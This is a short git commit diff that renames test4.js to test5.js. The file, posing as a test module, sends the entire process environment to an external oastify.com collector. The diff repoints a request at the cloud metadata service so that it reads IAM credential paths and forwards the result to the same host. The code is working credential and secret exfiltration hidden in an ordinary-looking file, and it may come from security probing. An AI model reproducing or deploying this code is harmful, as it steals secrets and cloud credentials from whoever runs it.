29a3d08102454b0454f344d7355818d46e7a43e3
Martin <martinbydefault@gmail.com>
2024-05-21 08:45:17 -0300

    Update and rename test4.js to test5.js

--- test5.js
+++ test5.js
@@ -3,7 +3,7 @@ const axios = require('axios');
 axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);
 
 module.exports = (context, req, res) => {
-  result = axios.get('http://169.254.169.254')
+  result = axios.get('http://169.254.169.254/latest/meta-data/iam/')
   axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
   return true;
 };
